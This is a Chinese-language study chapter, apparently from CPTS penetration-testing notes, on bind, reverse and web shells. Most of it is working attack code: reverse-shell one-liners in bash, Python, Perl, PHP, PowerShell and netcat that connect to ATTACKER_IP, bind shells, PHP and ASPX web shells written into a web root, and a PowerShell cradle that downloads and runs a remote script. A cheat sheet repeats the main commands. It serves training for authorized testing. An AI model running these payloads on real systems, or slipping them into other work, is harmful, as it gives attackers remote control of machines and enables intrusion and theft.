# 第 55 章 - Shell 基礎

## 標籤

- #cpts
- #chapter
- #shell
- #post-exploitation

## 學習目標

- 理解 bind shell、reverse shell 的差異與適用情境。
- 能用多種語言/工具建立 reverse shell 與 bind shell。
- 知道 TTY 與非 TTY shell 的差異與影響。
- 能判斷哪種 shell 類型適合當前網路情境。

---

## 理論基礎

```text
Reverse Shell（反向 shell）：
  目標主機 → 主動連回攻擊機
  優點：繞過入站防火牆（目標通常可出站 80/443）
  前提：攻擊機 IP 可被目標主機連線

Bind Shell（綁定 shell）：
  目標主機 → 開監聽埠，攻擊機主動連入
  優點：攻擊機在 NAT 後面也可用
  缺點：目標的入站防火牆常會封鎖

TTY vs 非 TTY：
  非 TTY shell（raw shell）：
    - Ctrl+C 直接終止 shell
    - 無法用 sudo、vim、nano、less、top
    - 輸出不整齊，互動性差
  TTY shell（pseudo-terminal）：
    - 完整終端體驗
    - 支援 job control（Ctrl+Z、bg、fg）
    - 需要做穩定化才能取得（見第 57 章）
```

---

## 方法一：Reverse Shell（攻擊機監聽，目標連回）

```bash
# ── 攻擊機先監聽 ──
nc -lvnp 4444
# -l → listen
# -v → verbose
# -n → 不做 DNS 解析
# -p → 指定埠

rlwrap nc -lvnp 4444
# rlwrap → 提供 readline 功能（方向鍵、歷史命令）
# 推薦搭配 rlwrap 以改善互動體驗

# ── 目標執行（Linux bash）──
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# bash -i → 互動式 bash
# >& /dev/tcp/... → 將 stdout+stderr 重定向到 TCP 連線
# 0>&1 → 將 stdin 也重定向

# bash（另一種寫法，某些環境更穩）
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
# -c → 執行字串指令（用於 RCE 注入時包在單引號內）

# sh（不是 bash 的環境）
sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# ── 目標執行（Python）──
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# socket.socket() → 建立 TCP socket
# s.connect() → 連回攻擊機
# os.dup2(s.fileno(), 0/1/2) → 將 socket 換成 stdin/stdout/stderr
# subprocess.call(["/bin/sh","-i"]) → 啟動 shell

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# python 2 版本

# ── 目標執行（Perl）──
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# ── 目標執行（PHP，Web RCE 常用）──
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# 或更完整版本
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# ── 目標執行（PowerShell，Windows）──
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()"

# ── 目標執行（nc 有 -e 版本，舊版 netcat）──
nc ATTACKER_IP 4444 -e /bin/sh
# -e → 將 /bin/sh 的 stdin/stdout 連到 socket（不是所有 nc 都有 -e）

# nc 沒有 -e 的替代
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
# mkfifo → 建立命名管道
# cat /tmp/f → 讀管道 → 送到 sh → 輸出回 nc → 回到管道（迴圈）
```

---

## 方法二：Bind Shell（目標監聽，攻擊機連入）

```bash
# ── 目標執行（開監聽）──
nc -lvnp 4444 -e /bin/sh
# 目標在 4444 開監聽，連入即取得 shell

# nc 沒有 -e 版本
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 >/tmp/f

# Python bind shell
python3 -c '
import socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.bind(("0.0.0.0",4444));
s.listen(1);
conn,addr=s.accept();
import os;
os.dup2(conn.fileno(),0);
os.dup2(conn.fileno(),1);
os.dup2(conn.fileno(),2);
subprocess.call(["/bin/sh","-i"])
'

# ── 攻擊機連入 ──
nc -nv TARGET_IP 4444
# 連到目標的 bind shell
```

---

## 方法三：Web Shell（Web RCE 環境）

```bash
# PHP webshell（最簡單）
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
# 觸發：http://TARGET_IP/shell.php?cmd=id

# PHP webshell（更隱蔽）
echo '<?php passthru($_REQUEST["c"]); ?>' > shell.php
# $_REQUEST 同時接受 GET 和 POST

# JSP webshell（Tomcat/Java 環境）
# 見 54A 章

# ASPX webshell（Windows IIS）
# cmd.aspx 常見內容：
# <%@ Page Language="C#" %>
# <% Response.Write(new System.Diagnostics.ProcessStartInfo("cmd", "/c " + Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}.Start().StandardOutput.ReadToEnd()); %>
```

---

## 決策流程

```
取得 RCE
    ↓
目標可出站（80/443/其他）？
  → 是：Reverse shell
      選 bash / python / perl / php / powershell（依目標 OS 和可用解譯器）
  → 否：Bind shell（nc -e / python / mkfifo）
    ↓
拿到 shell 後 → 確認是否有 TTY（試 sudo -l 或 vim）
  → 無 TTY → 做 Shell 穩定化（見第 57 章）
```

---

## 速查表

```bash
# 攻擊機監聽
rlwrap nc -lvnp 4444

# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python3 reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call(["/bin/sh","-i"])'

# nc reverse shell（無 -e）
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# PowerShell reverse shell（Windows）
powershell -NoP -NonI -Exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"

# Bind shell（目標）
nc -lvnp 4444 -e /bin/sh
# 攻擊機連入
nc -nv TARGET_IP 4444
```

---

## 常見錯誤與排查

- 目標不能出站卻只試 reverse shell → 改試 bind shell 或隧道。
- `bash -i >& /dev/tcp/...` 無效 → 目標 /bin/sh 不是 bash，改用 python 或 perl。
- nc 沒有 `-e` → 改用 mkfifo 管道版本。
- 拿到 shell 後 Ctrl+C 終止 → 未穩定化，去做 PTY 升級（第 57 章）。

---

## 關聯筆記

- [[57-Shell穩定化|第 57 章 - Shell 穩定化]]
- [[56-酬載產生|第 56 章 - 酬載產生]]
- [[06-Volume-6-Shells-and-Payloads-Index|Vol.6 - Shells and Payloads]]
